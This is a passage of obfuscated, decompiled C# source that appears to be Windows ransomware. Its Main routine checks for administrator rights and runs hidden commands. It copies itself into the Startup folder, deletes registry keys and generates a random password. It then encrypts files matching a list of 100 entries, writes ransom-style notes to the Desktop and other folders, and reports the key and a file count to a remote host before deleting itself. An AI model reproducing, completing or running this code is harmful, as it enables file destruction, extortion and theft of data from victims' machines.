	public static string hGxNuUuVHRPb;

	public static bool hNuljeIxIR;

	public static bool zmQpqXxwvrQiO;

	public static bool peXyLxGxshyj;

	public static bool mnLjajuxoQ;

	public static bool hyVzgCCllZ;

	public static string RttXBHxAtXbpy;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegated;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			CFUVphoNzERx CS_0024_003C_003E8__locals0 = new CFUVphoNzERx();
			CS_0024_003C_003E8__locals0.lvtJtkNIpNfLk = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.lvtJtkNIpNfLk) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			PUYOycMGUPHrQ.HSKUVbvFVqfzN(roKZpVREefQFqczv);
		}
		catch (Exception)
		{
		}
		try
		{
			if (IwmBMXxkSMFo == getString_0(107396827))
			{
				Thread thread = new Thread(CEDwliOrFHnfRcN.XQvwdYOQJe);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (pGTxrbvFFvWw == getString_0(107396827))
		{
			Thread.Sleep(int.Parse(HugrFqNrCOluH));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && BHhbCOBcJfrZk == getString_0(107396827))
		{
			try
			{
				VlPzSeXsvPzBKj(AmPZukeXOc(getString_0(107396822)));
			}
			catch
			{
			}
		}
		try
		{
			if (KAJZPWQXKT == getString_0(107396827) && qnfNjLTUcMnLm.TbRBfUqmZohGYnY())
			{
				new oxbvmJdGtz().pkiqzrqsUXhL(bool_0: false);
				qnfNjLTUcMnLm.yckfFHzTKOmgSza();
			}
		}
		catch (Exception)
		{
		}
		if (jMTvTvTWuoVeM == getString_0(107396827) && qnfNjLTUcMnLm.TbRBfUqmZohGYnY())
		{
			new oxbvmJdGtz().pkiqzrqsUXhL(bool_0: false);
			new oxbvmJdGtz().EBXqwJymvMl();
		}
		if (xbOCvFGxViyV == getString_0(107396827))
		{
			KBmSNklsMvqQcb.pZPGzExzorjMco();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397197);
			string text2 = text + Path.GetFileName(fileName);
			if (OsrQCxbVVsCitu == getString_0(107396827) && fileName != text2)
			{
				Thread thread2 = new Thread(lzjYpJhkymY);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (zUiqZNvIPXzzDC == getString_0(107396827) && mainModule != null && fileName != text2)
			{
				try
				{
					pRMQAzXFInpj = vkvNSplamhWg(0, AgWoNnmAIwySiZcF.Count);
					File.Copy(fileName, text + AgWoNnmAIwySiZcF[pRMQAzXFInpj], overwrite: true);
					Process.Start(text + AgWoNnmAIwySiZcF[pRMQAzXFInpj]);
					bKoxifDwFSxQ();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (bdGNFbULZa == getString_0(107396827) && DateTime.Now < ZQEIPelyPW)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (IRehrZgGrXfZCt == getString_0(107396827) && DateTime.Now > JjTFwhEfxSQmvJs)
			{
				bKoxifDwFSxQ();
			}
		}
		catch
		{
		}
		hsOVvlWtzmIOaB();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegated == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegated = delegate
			{
				List<string> oDWjvMaCnMDTRkh = ODWjvMaCnMDTRkh;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						snLYySJhNUySw(getString_0(107392253), string_0);
					};
				}
				Parallel.ForEach(oDWjvMaCnMDTRkh, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				List<string> zaKKBTtZrCeUHU = ZaKKBTtZrCeUHU;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						snLYySJhNUySw(getString_0(107392212), string_0);
					};
				}
				Parallel.ForEach(zaKKBTtZrCeUHU, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> source = kREXRPjHEpZCoq;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						snLYySJhNUySw(AmPZukeXOc(getString_0(107392199)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				if (WHujAzyFWUcX == getString_0(107396827))
				{
					string[] rdQxlJArxXaLAOF = RdQxlJArxXaLAOF;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
						{
							snLYySJhNUySw(AmPZukeXOc(getString_0(107392199)), getString_0(107392174) + string_0 + getString_0(107392197));
						};
					}
					Parallel.ForEach(rdQxlJArxXaLAOF, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				}
				if (!JYmdtNnSqjF().Contains(getString_0(107392950)))
				{
					cdqJpKBcXw(QPuKALhfazFp);
				}
				else
				{
					List<string> source2 = ppCaAZMFLGKX;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							snLYySJhNUySw(AmPZukeXOc(DYVGXLOvRXKES(getString_0(107392192))), string_0);
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				List<string> source3 = jdwHYBvnSeRZoVJU;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
					{
						snLYySJhNUySw(AmPZukeXOc(getString_0(107392135)), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				List<string> cbRMvMygdTdFS = CbRMvMygdTdFS;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						snLYySJhNUySw(getString_0(107392150), string_0);
					};
				}
				Parallel.ForEach(cbRMvMygdTdFS, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegated);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && WioJzBJzcy)
			{
				try
				{
					Thread thread4 = new Thread(duJHkcApTLZhAn.TVfhTZXyguZp);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			snLYySJhNUySw(getString_0(107397192), AmPZukeXOc(getString_0(107397211)));
			snLYySJhNUySw(getString_0(107397192), AmPZukeXOc(getString_0(107397106)));
			snLYySJhNUySw(AmPZukeXOc(getString_0(107397081)), AmPZukeXOc(getString_0(107397036)));
			snLYySJhNUySw(AmPZukeXOc(getString_0(107397081)), AmPZukeXOc(getString_0(107396394)));
		}
		SecureString secureString = new SecureString();
		if (MkUSgZLeVY == getString_0(107396284))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			CoSpOiSxhQnBVH = getString_0(107396279);
		}
		EiSXecLDoiHoz = iQJHAMSYRoCeWB.xNEMMZlJueN(GZjsrPyPVP(secureString));
		if (peXyLxGxshyj)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), RttXBHxAtXbpy)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), RttXBHxAtXbpy), string.Concat(AmPZukeXOc(getString_0(107396202)), new WebClient().DownloadString(AmPZukeXOc(getString_0(107396689))), getString_0(107396648), AmPZukeXOc(getString_0(107396675)), DateTime.Now, getString_0(107396648), AmPZukeXOc(getString_0(107396634)), EiSXecLDoiHoz));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), RttXBHxAtXbpy), getString_0(107396577) + EiSXecLDoiHoz);
				}
			}
			catch (Exception ex7)
			{
				if (hNuljeIxIR)
				{
					try
					{
						File.AppendAllText(hGxNuUuVHRPb, getString_0(107396548) + ex7.Message + getString_0(107396648));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		JxIFFyAmPaOFdk.rHyPdYmkkBs(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), uDXSolyKZuS), ejqUPFXfNDaagwR(EiSXecLDoiHoz), null, null, getString_0(107396467), getString_0(107396482), null);
		try
		{
			xtGCqKGrJXEIUB(new string[1] { getString_0(107395921) }, new string[100]
			{
				getString_0(107395912),
				getString_0(107395939),
				getString_0(107395934),
				getString_0(107395893),
				getString_0(107395888),
				getString_0(107395883),
				getString_0(107395878),
				getString_0(107395905),
				getString_0(107395900),
				getString_0(107395895),
				getString_0(107395858),
				getString_0(107395853),
				getString_0(107395876),
				getString_0(107395871),
				getString_0(107395862),
				getString_0(107395825),
				getString_0(107395820),
				getString_0(107395815),
				getString_0(107395842),
				getString_0(107395837),
				getString_0(107395796),
				getString_0(107395791),
				getString_0(107395786),
				getString_0(107395813),
				getString_0(107395808),
				getString_0(107395803),
				getString_0(107395798),
				getString_0(107395761),
				getString_0(107395756),
				getString_0(107395751),
				getString_0(107395778),
				getString_0(107395773),
				getString_0(107395768),
				getString_0(107395731),
				getString_0(107395722),
				getString_0(107395749),
				getString_0(107395744),
				getString_0(107395739),
				getString_0(107395878),
				getString_0(107395734),
				getString_0(107395900),
				getString_0(107395693),
				getString_0(107395688),
				getString_0(107395715),
				getString_0(107395710),
				getString_0(107395705),
				getString_0(107396180),
				getString_0(107396175),
				getString_0(107396170),
				getString_0(107396197),
				getString_0(107396192),
				getString_0(107396187),
				getString_0(107396182),
				getString_0(107396145),
				getString_0(107396140),
				getString_0(107396135),
				getString_0(107396162),
				getString_0(107396157),
				getString_0(107396116),
				getString_0(107396111),
				getString_0(107396102),
				getString_0(107396121),
				getString_0(107395734),
				getString_0(107396076),
				getString_0(107396099),
				getString_0(107396090),
				getString_0(107396049),
				getString_0(107396040),
				getString_0(107396063),
				getString_0(107396058),
				getString_0(107396017),
				getString_0(107396008),
				getString_0(107396031),
				getString_0(107396026),
				getString_0(107395989),
				getString_0(107395984),
				getString_0(107395979),
				getString_0(107395974),
				getString_0(107396001),
				getString_0(107395992),
				getString_0(107395955),
				getString_0(107395950),
				getString_0(107395945),
				getString_0(107395972),
				getString_0(107395967),
				getString_0(107395958),
				getString_0(107395405),
				getString_0(107395400),
				getString_0(107395768),
				getString_0(107395427),
				getString_0(107395422),
				getString_0(107395417),
				getString_0(107395380),
				getString_0(107395375),
				getString_0(107395366),
				getString_0(107395393),
				getString_0(107395388),
				getString_0(107395347),
				getString_0(107395342),
				getString_0(107395337)
			}, new string[0], GZjsrPyPVP(secureString), getString_0(107395364));
		}
		catch (Exception ex9)
		{
			if (hNuljeIxIR)
			{
				try
				{
					File.AppendAllText(hGxNuUuVHRPb, getString_0(107395355) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395330)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395330));
				streamWriter.WriteLine(AmPZukeXOc(getString_0(107395297)));
				streamWriter.WriteLine(getString_0(107396648));
				streamWriter.WriteLine(AmPZukeXOc(getString_0(107394899)));
				streamWriter.WriteLine(EiSXecLDoiHoz);
				if (UPjhbLGdmsrc == getString_0(107396284))
				{
					streamWriter.WriteLine(getString_0(107396648));
					streamWriter.WriteLine(AmPZukeXOc(getString_0(107394866)) + Convert.ToString(hHVQkDDqNsnqofdX.Count));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395330), getString_0(107394821) + EiSXecLDoiHoz);
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in jEFdDHVEvpn)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395330)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395330), item + getString_0(107395330), overwrite: true);
				}
				else
				{
					File.AppendAllText(item + getString_0(107395330), getString_0(107394821) + EiSXecLDoiHoz);
				}
			}
			catch (Exception)
			{
			}
			if (!kUTgXAQchF && num > 10)
			{
				break;
			}
		}
		if (dtSaeIkgqdX == getString_0(107396827))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394760)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394760));
					streamWriter2.WriteLine(AmPZukeXOc(getString_0(107394727)));
					streamWriter2.WriteLine(getString_0(107396648));
					streamWriter2.WriteLine(AmPZukeXOc(getString_0(107394742)));
					streamWriter2.WriteLine(EiSXecLDoiHoz + AmPZukeXOc(getString_0(107395165)));
					if (UPjhbLGdmsrc == getString_0(107396284))
					{
						streamWriter2.WriteLine(getString_0(107396648));
						streamWriter2.WriteLine(AmPZukeXOc(getString_0(107395120)) + AmPZukeXOc(getString_0(107394866)) + Convert.ToString(hHVQkDDqNsnqofdX.Count) + AmPZukeXOc(getString_0(107395165)));
					}
				}
				else
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394760), AmPZukeXOc(getString_0(107395120)) + getString_0(107394821) + EiSXecLDoiHoz + AmPZukeXOc(getString_0(107395165)));
				}
			}
			catch
			{
			}
		}
		if (MXVjkFaUjcnce == getString_0(107396827))
		{
			try
			{
				if (UPjhbLGdmsrc == getString_0(107396284))
				{
					cjKqlcIRmlYL.PZwksmFnrvdllwo(getString_0(107395059), getString_0(107395054), getString_0(107395073), string.Concat(AmPZukeXOc(getString_0(107396202)), new WebClient().DownloadString(AmPZukeXOc(getString_0(107396689))), getString_0(107395064), AmPZukeXOc(getString_0(107396675)), DateTime.Now, getString_0(107396648), AmPZukeXOc(getString_0(107395027)), Convert.ToString(hHVQkDDqNsnqofdX.Count), getString_0(107396648), AmPZukeXOc(getString_0(107396634)), EiSXecLDoiHoz));
				}
				else
				{
					cjKqlcIRmlYL.PZwksmFnrvdllwo(getString_0(107395059), getString_0(107395054), getString_0(107395073), string.Concat(AmPZukeXOc(getString_0(107396202)), new WebClient().DownloadString(AmPZukeXOc(getString_0(107396689))), getString_0(107395064), AmPZukeXOc(getString_0(107396675)), DateTime.Now, getString_0(107396648), AmPZukeXOc(getString_0(107395027)), Convert.ToString(hHVQkDDqNsnqofdX.Count), getString_0(107396648), AmPZukeXOc(getString_0(107396634)), EiSXecLDoiHoz));
				}
			}
			catch
			{
			}
		}
		if (RVlCWvulzwYZQm == getString_0(107396827))
		{
			try
			{
				WWizGdEsLcd.JznFKETmoYVCOgP(new Uri(getString_0(107395010)));
			}
			catch
			{
			}
		}
		if (dtSaeIkgqdX == getString_0(107396284))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395330)))
				{
					Process.Start(AmPZukeXOc(getString_0(107395009)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395330));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394760)))
				{
					Process.Start(AmPZukeXOc(getString_0(107394952)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394760));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(zxzFwgxFQS))
		{
			try
			{
				File.Delete(zxzFwgxFQS);
			}
			catch
			{
			}
		}
		if (hNuljeIxIR)
		{
			try
			{
				File.AppendAllText(hGxNuUuVHRPb, getString_0(107394967));
			}
			catch (Exception)
			{
			}
		}
		if (OnJlbPRXisiwnz == getString_0(107394922))
		{
			bKoxifDwFSxQ();
		}
	}

	public static void lzjYpJhkymY()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(AmPZukeXOc(getString_0(107394945)), AmPZukeXOc(getString_0(107394247)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int vkvNSplamhWg(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> CDydoithOcTTNs(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains(getString_0(107394262)) && !text.ToLower().Contains(getString_0(107394241)) && !text.ToLower().Contains(getString_0(107394196)) && !text.ToLower().Contains(getString_0(107394183)) && !text.ToLower().Contains(getString_0(107394158)) && !text.ToLower().Contains(getString_0(107394169)) && !text.ToLower().Contains(getString_0(107394636)) && !text.ToLower().Contains(getString_0(107394655)) && !text.ToLower().Contains(getString_0(107394618)) && !text.ToLower().Contains(getString_0(107394577)) && !text.ToLower().Contains(getString_0(107394592)) && !text.ToLower().Contains(getString_0(107394169)) && !text.ToLower().Contains(getString_0(107394547)) && !text.ToLower().Contains(getString_0(107394558)))
				{
					array = Directory.GetFiles(text);
					goto IL_01eb;
				}
			}
			catch
			{
			}
			continue;
			IL_01eb:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107394533)) && !fileInfo.FullName.Contains(getString_0(107394484)) && !fileInfo.FullName.Contains(getString_0(107394499)) && !fileInfo.FullName.Contains(getString_0(107394450)) && !fileInfo.FullName.Contains(getString_0(107394465)) && !fileInfo.FullName.Contains(getString_0(107394416)) && !fileInfo.FullName.Contains(getString_0(107394431)) && !fileInfo.FullName.Contains(getString_0(107393870)) && !fileInfo.FullName.Contains(getString_0(107393889)) && !fileInfo.FullName.Contains(getString_0(107393836)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393855)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393810)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393825)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393776)) && !fileInfo.FullName.Contains(AmPZukeXOc(getString_0(107393791))) && !fileInfo.FullName.Contains(getString_0(107393734)) && !fileInfo.FullName.Contains(getString_0(107393753)) && !fileInfo.FullName.EndsWith(getString_0(107395364)) && !fileInfo.FullName.EndsWith(getString_0(107393728)) && !fileInfo.FullName.EndsWith(getString_0(107393723)) && !fileInfo.FullName.EndsWith(getString_0(107393718)) && !fileInfo.FullName.EndsWith(getString_0(107393681)) && !fileInfo.FullName.Contains(getString_0(107393676)) && !fileInfo.FullName.Contains(uDXSolyKZuS) && !fileInfo.FullName.Contains(hGxNuUuVHRPb) && !fileInfo.FullName.Contains(RttXBHxAtXbpy))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(MDKWxnBlqhkR) * 1024.0 * 1024.0 && hyCSAaxuGHPteVhE == getString_0(107396827))
						{
							list.Add(fileInfo.FullName);
							oSRIdmvXGSvMw(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && hyCSAaxuGHPteVhE == getString_0(107396284))
						{
							list.Add(fileInfo.FullName);
							oSRIdmvXGSvMw(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string snLYySJhNUySw(string ReYNBjTpllf = "", string cMDLeePKFJaX = "")
	{
		string result = getString_0(107395010);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = ReYNBjTpllf,
				Arguments = cMDLeePKFJaX,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void VlPzSeXsvPzBKj(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107393691),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string DYVGXLOvRXKES(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string AmPZukeXOc(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void cdqJpKBcXw(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = AmPZukeXOc(getString_0(107393642));
		processStartInfo.Arguments = getString_0(107394125) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool tVWzlHZhcvgquxw(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string GZjsrPyPVP(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void hsOVvlWtzmIOaB()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = DYVGXLOvRXKES(getString_0(107394120));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(AmPZukeXOc(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(AmPZukeXOc(getString_0(107394014)));
					registryKey.DeleteSubKey(AmPZukeXOc(getString_0(107393989)));
					registryKey.DeleteSubKey(AmPZukeXOc(getString_0(107393940)));
					registryKey.DeleteSubKey(AmPZukeXOc(getString_0(107393947)));
					registryKey.DeleteSubKey(AmPZukeXOc(getString_0(107393642)));
					registryKey.DeleteSubKey(AmPZukeXOc(getString_0(107393922)));
					registryKey.DeleteSubKey(AmPZukeXOc(getString_0(107393381)));
					registryKey.Close();
				}
				string_ = DYVGXLOvRXKES(getString_0(107393332));
				registryKey = Registry.LocalMachine.OpenSubKey(AmPZukeXOc(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(AmPZukeXOc(getString_0(107393235)));
					registryKey.Close();
				}
				string_ = DYVGXLOvRXKES(getString_0(107393250));
				registryKey = Registry.LocalMachine.OpenSubKey(AmPZukeXOc(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(AmPZukeXOc(getString_0(107393235)));
					registryKey.Close();
				}
				string_ = DYVGXLOvRXKES(getString_0(107393250));
				registryKey = Registry.CurrentUser.OpenSubKey(AmPZukeXOc(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(AmPZukeXOc(getString_0(107393235)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			snLYySJhNUySw(AmPZukeXOc(getString_0(107393201)), AmPZukeXOc(getString_0(107393216)));
			snLYySJhNUySw(AmPZukeXOc(getString_0(107393135)), AmPZukeXOc(getString_0(107393126)));
			snLYySJhNUySw(AmPZukeXOc(getString_0(107393135)), AmPZukeXOc(getString_0(107393492)));
			snLYySJhNUySw(AmPZukeXOc(getString_0(107393463)), AmPZukeXOc(getString_0(107393414)));
		}
		catch
		{
		}
	}

	public static void EJthSefGcXhMJA(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(AmPZukeXOc(getString_0(107392861)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void bKoxifDwFSxQ()
	{
		snLYySJhNUySw(getString_0(107397192), AmPZukeXOc(getString_0(107392836)));
		string text = AmPZukeXOc(getString_0(107392642));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107393089) + text + getString_0(107393089) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397192);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void kwRLxOIARCnYa(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (hNuljeIxIR)
			{
				try
				{
					File.AppendAllText(hGxNuUuVHRPb, getString_0(107393084) + string_0 + getString_0(107393043) + ex.Message + getString_0(107396648));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string JYmdtNnSqjF()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107395010);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107392986);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107392977))) ? getString_0(107392991) : getString_0(107392968));
				break;
			case 0:
				text = getString_0(107393014);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107392949);
				break;
			case 4:
				text = getString_0(107392936);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107392950) : getString_0(107392959));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107392926) : getString_0(107392931)) : getString_0(107392904)) : getString_0(107392913));
				break;
			case 10:
				text = getString_0(107392921);
				break;
			}
		}
		if (text != getString_0(107395010))
		{
			text = getString_0(107392884) + text;
			if (oSVersion.ServicePack != getString_0(107395010))
			{
				text = text + getString_0(107392871) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string ejqUPFXfNDaagwR(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395330);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(AmPZukeXOc(getString_0(107395297)));
